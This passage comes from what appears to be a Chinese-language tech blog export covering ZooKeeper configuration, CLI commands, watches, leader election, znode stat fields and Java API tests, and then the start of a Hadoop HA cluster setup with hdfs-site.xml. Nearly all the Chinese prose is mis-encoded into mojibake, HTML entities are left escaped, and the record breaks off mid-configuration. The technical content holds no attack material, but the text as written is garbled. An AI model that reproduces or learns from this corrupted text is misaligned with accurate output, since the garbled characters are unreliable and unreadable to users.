æ•´ä¸ªé›†ç¾¤æ˜¯æŒ‚æ‰çš„* åªæœ‰å¯åŠ¨çš„æœºå™¨æ•°é‡è¶…è¿‡é…ç½®çš„åŠæ•°, zk é›†ç¾¤æ‰æœ‰æ•ˆ. 2.2.3 zoo.cfg æ–‡ä»¶ä¸­é…ç½®å‚æ•°çš„å«ä¹‰1234567891011121314151617181920212223242526271ï¼‰tickTime=2000ï¼šé€šä¿¡å¿ƒè·³æ•° tickTimeï¼šé€šä¿¡å¿ƒè·³æ•°ï¼ŒZookeeperæœåŠ¡å™¨å¿ƒè·³æ—¶é—´ï¼Œå•ä½æ¯«ç§’ Zookeeperä½¿ç”¨çš„åŸºæœ¬æ—¶é—´ï¼ŒæœåŠ¡å™¨ä¹‹é—´æˆ–å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´ç»´æŒå¿ƒè·³çš„æ—¶é—´é—´éš”ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªtickTimeæ—¶é—´å°±ä¼šå‘é€ä¸€ä¸ªå¿ƒè·³ï¼Œæ—¶é—´å•ä½ä¸ºæ¯«ç§’ã€‚ å®ƒç”¨äºå¿ƒè·³æœºåˆ¶ï¼Œå¹¶ä¸”è®¾ç½®æœ€å°çš„sessionè¶…æ—¶æ—¶é—´ä¸ºä¸¤å€å¿ƒè·³æ—¶é—´ã€‚(sessionçš„æœ€å°è¶…æ—¶æ—¶é—´æ˜¯2*tickTime)2ï¼‰initLimit=10ï¼šLFåˆå§‹é€šä¿¡æ—¶é™ initLimitï¼šLFåˆå§‹é€šä¿¡æ—¶é™ é›†ç¾¤ä¸­çš„followerè·Ÿéšè€…æœåŠ¡å™¨(F)ä¸leaderé¢†å¯¼è€…æœåŠ¡å™¨(L)ä¹‹é—´åˆå§‹è¿æ¥æ—¶èƒ½å®¹å¿çš„æœ€å¤šå¿ƒè·³æ•°ï¼ˆtickTimeçš„æ•°é‡ï¼‰ï¼Œç”¨å®ƒæ¥é™å®šé›†ç¾¤ä¸­çš„ZookeeperæœåŠ¡å™¨è¿æ¥åˆ°Leaderçš„æ—¶é™ã€‚ æŠ•ç¥¨é€‰ä¸¾æ–°leaderçš„åˆå§‹åŒ–æ—¶é—´ Followeråœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œä¼šä»LeaderåŒæ­¥æ‰€æœ‰æœ€æ–°æ•°æ®ï¼Œç„¶åç¡®å®šè‡ªå·±èƒ½å¤Ÿå¯¹å¤–æœåŠ¡çš„èµ·å§‹çŠ¶æ€ã€‚ Leaderå…è®¸Fåœ¨initLimitæ—¶é—´å†…å®Œæˆè¿™ä¸ªå·¥ä½œã€‚3ï¼‰syncLimit=5ï¼šLFåŒæ­¥é€šä¿¡æ—¶é™ syncLimitï¼šLFåŒæ­¥é€šä¿¡æ—¶é™ é›†ç¾¤ä¸­Leaderä¸Followerä¹‹é—´çš„æœ€å¤§å“åº”æ—¶é—´å•ä½ï¼Œå‡å¦‚å“åº”è¶…è¿‡syncLimit * tickTimeï¼Œ Leaderè®¤ä¸ºFollweræ­»æ‰ï¼Œä»æœåŠ¡å™¨åˆ—è¡¨ä¸­åˆ é™¤Follwerã€‚ åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒLeaderè´Ÿè´£ä¸ZKé›†ç¾¤ä¸­æ‰€æœ‰æœºå™¨è¿›è¡Œé€šä¿¡ï¼Œä¾‹å¦‚é€šè¿‡ä¸€äº›å¿ƒè·³æ£€æµ‹æœºåˆ¶ï¼Œæ¥æ£€æµ‹æœºå™¨çš„å­˜æ´»çŠ¶æ€ã€‚ å¦‚æœLå‘å‡ºå¿ƒè·³åŒ…åœ¨syncLimitä¹‹åï¼Œè¿˜æ²¡æœ‰ä»Fé‚£æ”¶åˆ°å“åº”ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºè¿™ä¸ªFå·²ç»ä¸åœ¨çº¿äº†ã€‚4ï¼‰dataDirï¼šæ•°æ®æ–‡ä»¶ç›®å½•+æ•°æ®æŒä¹…åŒ–è·¯å¾„ dataDirï¼šæ•°æ®æ–‡ä»¶ç›®å½•+æ•°æ®æŒä¹…åŒ–è·¯å¾„ ä¿å­˜å†…å­˜æ•°æ®åº“å¿«ç…§ä¿¡æ¯çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰å…¶ä»–è¯´æ˜ï¼Œæ›´æ–°çš„äº‹åŠ¡æ—¥å¿—ä¹Ÿä¿å­˜åˆ°æ•°æ®åº“ã€‚5ï¼‰clientPort=2181ï¼šå®¢æˆ·ç«¯è¿æ¥ç«¯å£ ç›‘å¬å®¢æˆ·ç«¯è¿æ¥çš„ç«¯å£6) Server.A=B:C:Dã€‚ Aæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºè¿™ä¸ªæ˜¯ç¬¬å‡ å·æœåŠ¡å™¨ï¼› Bæ˜¯è¿™ä¸ªæœåŠ¡å™¨çš„ipåœ°å€ï¼› Cæ˜¯è¿™ä¸ªæœåŠ¡å™¨ä¸é›†ç¾¤ä¸­çš„LeaderæœåŠ¡å™¨äº¤æ¢ä¿¡æ¯çš„ç«¯å£ï¼› Dæ˜¯ä¸‡ä¸€é›†ç¾¤ä¸­çš„LeaderæœåŠ¡å™¨æŒ‚äº†ï¼Œéœ€è¦ä¸€ä¸ªç«¯å£æ¥é‡æ–°è¿›è¡Œé€‰ä¸¾ï¼Œé€‰å‡ºä¸€ä¸ªæ–°çš„Leaderï¼Œè€Œè¿™ä¸ªç«¯å£å°±æ˜¯ç”¨æ¥æ‰§è¡Œé€‰ä¸¾æ—¶æœåŠ¡å™¨ç›¸äº’é€šä¿¡çš„ç«¯å£ã€‚ # é›†ç¾¤æ¨¡å¼ä¸‹é…ç½®ä¸€ä¸ªæ–‡ä»¶myidï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨dataDirç›®å½•ä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œé¢æœ‰ä¸€ä¸ªæ•°æ®å°±æ˜¯Açš„å€¼ï¼ŒZookeeperå¯åŠ¨æ—¶è¯»å–æ­¤æ–‡ä»¶ï¼Œæ‹¿åˆ°é‡Œé¢çš„æ•°æ®ä¸zoo.cfgé‡Œé¢çš„é…ç½®ä¿¡æ¯æ¯”è¾ƒä»è€Œåˆ¤æ–­åˆ°åº•æ˜¯å“ªä¸ªserverã€‚ 2.2 ZKå®¢æˆ·ç«¯çš„è¿æ¥12345678910111213141516171819202122232425262728293031323334353637383940414243$&gt;zkCli.sh -server cs1:2181 //è¿›å…¥zkå‘½ä»¤è¡Œ$zk]help //æŸ¥çœ‹å¸®åŠ©$zk]quit //é€€å‡º$zk]create /a tom //åˆ›å»ºèŠ‚ç‚¹$zk]get /a //æŸ¥çœ‹æ•°æ®$zk]ls / //åˆ—å‡ºèŠ‚ç‚¹$zk]ls2 / //æŸ¥çœ‹å½“å‰èŠ‚ç‚¹æ•°æ®å¹¶èƒ½çœ‹åˆ°æ›´æ–°æ¬¡æ•°ç­‰æ•°æ®$zk]set /a tom //è®¾ç½®æ•°æ®$zk]delete /a //åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹$zk]rmr /a //é€’å½’åˆ é™¤æ‰€æœ‰èŠ‚ç‚¹ã€‚$zk]stat / //æŸ¥çœ‹èŠ‚ç‚¹çŠ¶æ€æ³¨æ„: * åˆ›å»ºèŠ‚ç‚¹ä¸èƒ½é€’å½’åˆ›å»º, ç›®å‰åªèƒ½ä¸€å±‚ä¸€å±‚åˆ›å»º* æ¯æ¬¡åˆ›å»ºéƒ½çš„å†™æ•°æ®, åªåˆ›å»ºç›®å½•çš„è¯ä¼šåˆ›å»ºä¸æˆåŠŸ* å¦‚æœ close å, å¹¶æ²¡æœ‰é€€å‡ºå®¢æˆ·ç«¯, åªæ˜¯è®¿é—®ä¸åˆ°æ•°æ®, æ­¤æ—¶å¦‚æœæƒ³è¦è¿æ¥, å¯ä»¥ç”¨connect host:port================================================================================ZK çš„å¸®åŠ©æ–‡æ¡£----------------help:ZooKeeper -server host:port cmd args stat path [watch] set path data [version] ls path [watch] delquota [-n|-b] path ls2 path [watch] setAcl path acl setquota -n|-b val path history redo cmdno printwatches on|off delete path [version] sync path listquota path rmr path get path [watch] create [-s] [-e] path data acl addauth scheme auth quit getAcl path close connect host:port 2.3 ç›‘å¬æµ‹è¯•æ³¨æ„ç‚¹: æ³¨å†Œçš„ç›‘å¬åªèƒ½ä½¿ç”¨ä¸€æ¬¡, ç›‘å¬å®Œæ¯•åéœ€è¦é‡æ–°æ³¨å†Œ. 123456789101112131415161718192021222324=======èŠ‚ç‚¹å€¼çš„å˜åŒ–çš„ç›‘å¬==========ï¼ˆ1ï¼‰åœ¨cs1ä¸»æœºä¸Šæ³¨å†Œç›‘å¬/app1èŠ‚ç‚¹æ•°æ®å˜åŒ–[zk: localhost:2181(CONNECTED) 26] get /app1 watch ï¼ˆ2ï¼‰åœ¨cs2ä¸»æœºä¸Šä¿®æ”¹/app1èŠ‚ç‚¹çš„æ•°æ®[zk: localhost:2181(CONNECTED) 5] set /app1 777ï¼ˆ3ï¼‰è§‚å¯Ÿcs2ä¸»æœºæ”¶åˆ°æ•°æ®å˜åŒ–çš„ç›‘å¬WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/app1=======èŠ‚ç‚¹çš„å­èŠ‚ç‚¹å˜åŒ–çš„ç›‘å¬==========ï¼ˆ1ï¼‰åœ¨cs1ä¸»æœºä¸Šæ³¨å†Œç›‘å¬/app1èŠ‚ç‚¹çš„å­èŠ‚ç‚¹å˜åŒ–[zk: localhost:2181(CONNECTED) 1] ls /app1 watch[aa0000000001, server101]ï¼ˆ2ï¼‰åœ¨cs2ä¸»æœº/app1èŠ‚ç‚¹ä¸Šåˆ›å»ºå­èŠ‚ç‚¹[zk: localhost:2181(CONNECTED) 6] create /app1/bb 666Created /app1/bbï¼ˆ3ï¼‰è§‚å¯Ÿcs1ä¸»æœºæ”¶åˆ°å­èŠ‚ç‚¹å˜åŒ–çš„ç›‘å¬WATCHER::WatchedEvent state:SyncConnected type:NodeChildrenChanged path:/app1 3. ZK å†…éƒ¨æœºåˆ¶3.1 é€‰ä¸¾æœºåˆ¶3.1.1. zookeeperçš„é€‰ä¸¾æœºåˆ¶ï¼ˆå…¨æ–°é›†ç¾¤paxosï¼‰ä»¥ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥è¯´æ˜æ•´ä¸ªé€‰ä¸¾çš„è¿‡ç¨‹. å‡è®¾æœ‰äº”å°æœåŠ¡å™¨ç»„æˆçš„zookeeperé›†ç¾¤,å®ƒä»¬çš„idä»1-5,åŒæ—¶å®ƒä»¬éƒ½æ˜¯æœ€æ–°å¯åŠ¨çš„,ä¹Ÿå°±æ˜¯æ²¡æœ‰å†å²æ•°æ®,åœ¨å­˜æ”¾æ•°æ®é‡è¿™ä¸€ç‚¹ä¸Š,éƒ½æ˜¯ä¸€æ ·çš„.å‡è®¾è¿™äº›æœåŠ¡å™¨ä¾åºå¯åŠ¨,æ¥çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆ. 1) æœåŠ¡å™¨1å¯åŠ¨,æ­¤æ—¶åªæœ‰å®ƒä¸€å°æœåŠ¡å™¨å¯åŠ¨äº†,å®ƒå‘å‡ºå»çš„æŠ¥æ²¡æœ‰ä»»ä½•å“åº”,æ‰€ä»¥å®ƒçš„é€‰ä¸¾çŠ¶æ€ä¸€ç›´æ˜¯LOOKINGçŠ¶æ€ 2) æœåŠ¡å™¨2å¯åŠ¨,å®ƒä¸æœ€å¼€å§‹å¯åŠ¨çš„æœåŠ¡å™¨1è¿›è¡Œé€šä¿¡,äº’ç›¸äº¤æ¢è‡ªå·±çš„é€‰ä¸¾ç»“æœ,ç”±äºä¸¤è€…éƒ½æ²¡æœ‰å†å²æ•°æ®,æ‰€ä»¥idå€¼è¾ƒå¤§çš„æœåŠ¡å™¨2èƒœå‡º,ä½†æ˜¯ç”±äºæ²¡æœ‰è¾¾åˆ°è¶…è¿‡åŠæ•°ä»¥ä¸Šçš„æœåŠ¡å™¨éƒ½åŒæ„é€‰ä¸¾å®ƒ(è¿™ä¸ªä¾‹å­ä¸­çš„åŠæ•°ä»¥ä¸Šæ˜¯3),æ‰€ä»¥æœåŠ¡å™¨1,2è¿˜æ˜¯ç»§ç»­ä¿æŒLOOKINGçŠ¶æ€. 3) æœåŠ¡å™¨3å¯åŠ¨,æ ¹æ®å‰é¢çš„ç†è®ºåˆ†æ,æœåŠ¡å™¨3æˆä¸ºæœåŠ¡å™¨1,2,3ä¸­çš„è€å¤§,è€Œä¸ä¸Šé¢ä¸åŒçš„æ˜¯,æ­¤æ—¶æœ‰ä¸‰å°æœåŠ¡å™¨é€‰ä¸¾äº†å®ƒ,æ‰€ä»¥å®ƒæˆä¸ºäº†è¿™æ¬¡é€‰ä¸¾çš„leader. 4) æœåŠ¡å™¨4å¯åŠ¨,æ ¹æ®å‰é¢çš„åˆ†æ,ç†è®ºä¸ŠæœåŠ¡å™¨4åº”è¯¥æ˜¯æœåŠ¡å™¨1,2,3,4ä¸­æœ€å¤§çš„,ä½†æ˜¯ç”±äºå‰é¢å·²ç»æœ‰åŠæ•°ä»¥ä¸Šçš„æœåŠ¡å™¨é€‰ä¸¾äº†æœåŠ¡å™¨3,æ‰€ä»¥å®ƒåªèƒ½æ¥æ”¶å½“å°å¼Ÿçš„å‘½äº†. 5) æœåŠ¡å™¨5å¯åŠ¨,åŒ4ä¸€æ ·,å½“å°å¼Ÿ. 3.1.2. éå…¨æ–°é›†ç¾¤çš„é€‰ä¸¾æœºåˆ¶(æ•°æ®æ¢å¤)é‚£ä¹ˆï¼Œåˆå§‹åŒ–çš„æ—¶å€™ï¼Œæ˜¯æŒ‰ç…§ä¸Šè¿°çš„è¯´æ˜è¿›è¡Œé€‰ä¸¾çš„ï¼Œä½†æ˜¯å½“zookeeperè¿è¡Œäº†ä¸€æ®µæ—¶é—´ä¹‹åï¼Œæœ‰æœºå™¨downæ‰ï¼Œé‡æ–°é€‰ä¸¾æ—¶ï¼Œé€‰ä¸¾è¿‡ç¨‹å°±ç›¸å¯¹å¤æ‚äº†ã€‚ éœ€è¦åŠ å…¥æ•°æ®idã€leader idå’Œé€»è¾‘æ—¶é’Ÿã€‚ æ•°æ®idï¼šæ•°æ®æ–°çš„idå°±å¤§ï¼Œæ•°æ®æ¯æ¬¡æ›´æ–°éƒ½ä¼šæ›´æ–°idã€‚ Leader idï¼šå°±æ˜¯æˆ‘ä»¬é…ç½®çš„myidä¸­çš„å€¼ï¼Œæ¯ä¸ªæœºå™¨ä¸€ä¸ªã€‚ é€»è¾‘æ—¶é’Ÿï¼šè¿™ä¸ªå€¼ä»0å¼€å§‹é€’å¢,æ¯æ¬¡é€‰ä¸¾å¯¹åº”ä¸€ä¸ªå€¼,ä¹Ÿå°±æ˜¯è¯´: å¦‚æœåœ¨åŒä¸€æ¬¡é€‰ä¸¾ä¸­,é‚£ä¹ˆè¿™ä¸ªå€¼åº”è¯¥æ˜¯ä¸€è‡´çš„ ; é€»è¾‘æ—¶é’Ÿå€¼è¶Šå¤§,è¯´æ˜è¿™ä¸€æ¬¡é€‰ä¸¾leaderçš„è¿›ç¨‹æ›´æ–°. é€‰ä¸¾çš„æ ‡å‡†å°±å˜æˆï¼š â€‹ 1ã€é€»è¾‘æ—¶é’Ÿå°çš„é€‰ä¸¾ç»“æœè¢«å¿½ç•¥ï¼Œé‡æ–°æŠ•ç¥¨ â€‹ 2ã€ç»Ÿä¸€é€»è¾‘æ—¶é’Ÿåï¼Œæ•°æ®idå¤§çš„èƒœå‡º â€‹ 3ã€æ•°æ®idç›¸åŒçš„æƒ…å†µä¸‹ï¼Œleader idå¤§çš„èƒœå‡º æ ¹æ®è¿™ä¸ªè§„åˆ™é€‰å‡ºleaderã€‚ 3.2 stat çš„ç»“æ„ 1ï¼‰czxid- å¼•èµ·è¿™ä¸ªznodeåˆ›å»ºçš„zxidï¼Œåˆ›å»ºèŠ‚ç‚¹çš„äº‹åŠ¡çš„zxid æ¯æ¬¡ä¿®æ”¹ZooKeeperçŠ¶æ€éƒ½ä¼šæ”¶åˆ°ä¸€ä¸ªzxidå½¢å¼çš„æ—¶é—´æˆ³ï¼Œä¹Ÿå°±æ˜¯ZooKeeperäº‹åŠ¡IDã€‚äº‹åŠ¡IDæ˜¯ZooKeeperä¸­æ‰€æœ‰ä¿®æ”¹æ€»çš„æ¬¡åºã€‚æ¯ä¸ªä¿®æ”¹éƒ½æœ‰å”¯ä¸€çš„zxidï¼Œå¦‚æœzxid1å°äºzxid2ï¼Œé‚£ä¹ˆzxid1åœ¨zxid2ä¹‹å‰å‘ç”Ÿã€‚ 2ï¼‰ctime - znodeè¢«åˆ›å»ºçš„æ¯«ç§’æ•°(ä»1970å¹´å¼€å§‹) 3ï¼‰mzxid - znodeæœ€åæ›´æ–°çš„zxid 4ï¼‰mtime - znodeæœ€åä¿®æ”¹çš„æ¯«ç§’æ•°(ä»1970å¹´å¼€å§‹) 5ï¼‰pZxid-znodeæœ€åæ›´æ–°çš„å­èŠ‚ç‚¹zxid 6ï¼‰cversion - znodeå­èŠ‚ç‚¹å˜åŒ–å·ï¼Œznodeå­èŠ‚ç‚¹ä¿®æ”¹æ¬¡æ•° 7ï¼‰dataversion - znodeæ•°æ®å˜åŒ–å· 8ï¼‰aclVersion - znodeè®¿é—®æ§åˆ¶åˆ—è¡¨çš„å˜åŒ–å· 9ï¼‰ephemeralOwner- å¦‚æœæ˜¯ä¸´æ—¶èŠ‚ç‚¹ï¼Œè¿™ä¸ªæ˜¯znodeæ‹¥æœ‰è€…çš„session idã€‚å¦‚æœä¸æ˜¯ä¸´æ—¶èŠ‚ç‚¹åˆ™æ˜¯0ã€‚ 10ï¼‰dataLength- znodeçš„æ•°æ®é•¿åº¦ 11ï¼‰numChildren - znodeå­èŠ‚ç‚¹æ•°é‡ 4. é€šè¿‡ JavaAPI è®¿é—® ZK4.1 æ·»åŠ Maven ä¾èµ–123456789101112131415161718192021222324259.1[pom.xml]&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.it18zhang&lt;/groupId&gt; &lt;artifactId&gt;ZooKeeperDemo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.9&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 4.2 Java ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134* å¯¹åº”å…³ç³»:* Linux Java----------------------* ls getChildren* get getData* set setDAta* create createË˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜Ë˜package com.rox.zktest;import org.apache.zookeeper.*;import org.apache.zookeeper.data.ACL;import org.apache.zookeeper.data.Stat;import org.junit.Test;import java.io.IOException;import java.util.List;/** * å¯¹åº”å…³ç³»: * Linux Java * ls getChildren * get getData * set setDAta * create create */public class TestZK &#123; @Test public void ls() throws IOException, KeeperException, InterruptedException &#123; /** * æ”¾ä¸‰ä¸ªå°±ä¸è¡Œ, åªèƒ½æ”¾2ä¸ªç›®å‰æ¥çœ‹ */ ZooKeeper zk = new ZooKeeper("cs1:2181,cs2:2181,cs3:2181", 5000, null); List&lt;String&gt; list = zk.getChildren("/", null); for (String s : list) &#123; System.out.println(s); &#125; &#125; @Test public void lsAll() &#123; try &#123; ls("/"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * åˆ—å‡ºæŒ‡å®š path ä¸‹çš„children * * @param path */ public void ls(String path) throws Exception &#123; System.out.println(path); ZooKeeper zk = new ZooKeeper("cs1:2181,cs2:2181,cs3:2181", 5000, null); List&lt;String&gt; list = zk.getChildren(path, null); if (list == null || list.isEmpty()) &#123; return; &#125; for (String s : list) &#123; // å…ˆè¾“å‡º children if (path.equals("/" )) &#123; ls(path + s); &#125; else &#123; ls(path + "/" + s); &#125; &#125; &#125; /** * è®¾ç½®æ•°æ® */ @Test public void setData() throws Exception &#123; ZooKeeper zk = new ZooKeeper("cs1:2181", 5000, null); zk.setData("/a","tomaslee".getBytes(),0); &#125; /** * åˆ›å»ºä¸´æ—¶èŠ‚ç‚¹ */ @Test public void createEPHEMERAL() throws Exception &#123; ZooKeeper zk = new ZooKeeper("cs1:2181", 5000, null); zk.create("/c/c1", "tom".getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL); System.out.println("hello"); &#125; /** * åˆ›å»ºè§‚å¯Ÿè€… */ @Test public void testWatch() throws Exception &#123; final ZooKeeper zk = new ZooKeeper("cs1:2181,cs2:2181,cs3:2181", 5000, null); Stat st = new Stat(); Watcher w = null; w = new Watcher() &#123; public void process(WatchedEvent event) &#123; try &#123; System.out.println("æ•°æ®æ”¹äº†..."); zk.getData("/a",this,null); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;; byte[] data = zk.getData("/a",w,st); System.out.println(new String(data)); while (true) &#123; Thread.sleep(1000); &#125; &#125;&#125;]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Zookeeper</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop-HAé«˜å¯ç”¨é›†ç¾¤QJMæ­å»º]]></title>
    <url>%2F2018%2F06%2F22%2FHadoop%2F0-Hadoop%2FHadoop-HA%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[1.æ­¤æ•™ç¨‹é»˜è®¤å·²ç»æ­å»ºå¥½å®Œå…¨åˆ†å¸ƒå¼2. Zookeeper é›†ç¾¤æ­å»º1234567891011121314151617181920212223242526272829é…ç½®å®Œå…¨åˆ†å¸ƒå¼zké›†ç¾¤--------------------- 1.æŒ‘é€‰3å°ä¸»æœº cs1 ~ cs3 2.æ¯å°æœºå™¨éƒ½å®‰è£…zk tar ç¯å¢ƒå˜é‡ 3.é…ç½®zké…ç½®æ–‡ä»¶ cs1 ~ cs3 [/home/ap/apps/zk/conf/zoo.cfg] ... dataDir=/home/ap/zookeeper 4.åœ¨æ¯å°ä¸»æœºçš„/home/centos/zookeeperä¸­æ·»åŠ myid,å†…å®¹åˆ†åˆ«æ˜¯1,2,3 [cs1] $&gt;echo 1 &gt; /home/ap/zookeeper/myid [cs2] $&gt;echo 2 &gt; /home/ap/zookeeper/myid [cs3] $&gt;echo 3 &gt; /home/ap/zookeeper/myid 5.å¯åŠ¨æœåŠ¡å™¨é›†ç¾¤ $&gt;zkServer.sh start 6.æŸ¥çœ‹æ¯å°æœåŠ¡å™¨çš„çŠ¶æ€ $&gt;zkServer.sh status* æ³¨æ„: å¦‚æœæœ‰3å°æœºå™¨, åªå¯åŠ¨ä¸€å°çš„è¯, ä¼šæ˜¾ç¤ºå¦‚ä¸‹, å› ä¸ºæ ¹æ®é…ç½®, æœ‰3å°æœºå™¨, æ­¤æ—¶åªæœ‰ä¸€å°å¯åŠ¨, æ²¡æœ‰è¿‡åŠæ•°, æ•´ä¸ªé›†ç¾¤æ˜¯æŒ‚æ‰çš„* åªæœ‰å¯åŠ¨çš„æœºå™¨æ•°é‡è¶…è¿‡é…ç½®çš„åŠæ•°, zk é›†ç¾¤æ‰æœ‰æ•ˆ. 3.HA é›†ç¾¤æ­å»ºé¦–å…ˆå£°æ˜ç¬”è€…ç”¨çš„6å°ä¸»æœº, ä¸»æœºå cs1-cs6, ç”¨æˆ·åä¸ºap, å¯ä»¥å¯¹ç…§æ”¹ä¸ºè‡ªå·±çš„ä¸»æœºå&amp;ç”¨æˆ·å å¦å¤–, æ­å»º HA ä¸ä¼šå½±å“åŸæ¥çš„å®Œå…¨åˆ†å¸ƒå¼, å…·ä½“æ“ä½œä¼šåœ¨ä¸‹é¢å‘ŠçŸ¥.hadoop å®‰è£…ç›®å½•å±‚çº§ç»“æ„: /home/ap/apps/hadoop/etc/hadoop/hdfs-site.xml data ç›®å½•å±‚çº§ç»“æ„: cs1: /home/ap/hadoopdata/namenode/current/edits_00.... cs2: /home/ap/hadoopdata/datanode/current/BP-15... å¯ä»¥å¯¹ç…§å‚è€ƒ é›†ç¾¤ç»“æ„å¦‚ä¸‹ å¼€å§‹æ­å»ºé¦–å…ˆä¿è¯ å„èŠ‚ç‚¹ç›´æ¥çš„ ssh å…å¯†ç™»å½•æ²¡é—®é¢˜ å¦‚æœéç”Ÿäº§ç¯å¢ƒ, å¯ä»¥åŒæ—¶æŠŠ .sshåˆ æ‰å, å…¨éƒ¨é‡æ–°ç”Ÿæˆ ssh-keygen, åŒæ—¶ç›¸äº’å‘é€, è¿™æ ·æ“ä½œæœ€ç®€å•, æ•ˆç‡æœ€é«˜. å…¶æ¬¡ä¸Šä»£ç äº† æŠŠåŸæœ¬/home/ap/apps/hadoop/etc/hadoopä¸­çš„ hadoopç›®å½•æ”¹ä¸ºfull,æ„æ€æ˜¯å®Œå…¨åˆ†å¸ƒå¼. cp -r full ha, å¤åˆ¶ä¸€ä»½ full ä¸º ha, åœ¨è¿™ä»½é…ç½®æ–‡ä»¶ä¸­é…ç½® HA ln -s /home/ap/apps/hadoop/etc/ha /home/ap/apps/hadoop/etc/hadoop, ç”¨ä¸€ä¸ªè½¯é“¾æ¥hadoop æŒ‡å‘ ha é…ç½® /home/ap/apps/hadoop/etc/ha/hdfs-site.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576[hdfs-site.xml]------------------------------------------------------------------&lt;configuration&gt; &lt;!-- æŒ‡å®š 2ä¸ª namenode çš„å‘½åç©ºé—´ --&gt; &lt;property&gt; &lt;name&gt;dfs.nameservices&lt;/name&gt; &lt;value&gt;mycluster&lt;/value&gt; &lt;/property&gt; &lt;!-- myuclusterä¸‹çš„åç§°èŠ‚ç‚¹ä¸¤ä¸ªid --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.namenodes.mycluster&lt;/name&gt; &lt;value&gt;nn1,nn2&lt;/value&gt; &lt;/property&gt; &lt;!-- é…ç½®æ¯ä¸ªnnçš„rpcåœ°å€ã€‚ --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.mycluster.nn1&lt;/name&gt; &lt;value&gt;cs1:8020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.mycluster.nn2&lt;/name&gt; &lt;value&gt;cs6:8020&lt;/value&gt; &lt;/property&gt; &lt;!-- é…ç½®webuiç«¯å£ --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address.mycluster.nn1&lt;/name&gt; &lt;value&gt;cs1:50070&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address.mycluster.nn2&lt;/name&gt; &lt;value&gt;cs6:50070&lt;/value&gt; &lt;/property&gt; &lt;!-- åç§°èŠ‚ç‚¹å…±äº«ç¼–è¾‘ç›®å½•. --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.shared.edits.dir&lt;/name&gt; &lt;value&gt;qjournal://cs2:8485;cs3:8485;cs4:8485/mycluster&lt;/value&gt; &lt;/property&gt; &lt;!-- javaç±»ï¼Œclientä½¿ç”¨å®ƒåˆ¤æ–­å“ªä¸ªèŠ‚ç‚¹æ˜¯æ¿€æ´»æ€ã€‚ --&gt; &lt;property&gt; &lt;name&gt;dfs.client.failover.proxy.provider.mycluster&lt;/name&gt; &lt;value&gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&lt;/value&gt; &lt;/property&gt; &lt;!-- è„šæœ¬åˆ—è¡¨æˆ–è€…javaç±»ï¼Œåœ¨å®¹ç¾ä¿æŠ¤æ¿€æ´»æ€çš„nn. --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.methods&lt;/name&gt; &lt;value&gt; sshfence shell(/bin/true) &lt;/value&gt; &lt;/property&gt; &lt;!-- sshå…å¯†ç™»é™† --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.ssh.private-key-files&lt;/name&gt; &lt;value&gt;/home/ap/.ssh/id_rsa&lt;/value&gt; &lt;/property&gt; &lt;!-- é…ç½® sshfence éš”ç¦»æœºåˆ¶è¶…æ—¶æ—¶é—´(å¯ä¸é…) --&gt; &lt;property&gt; 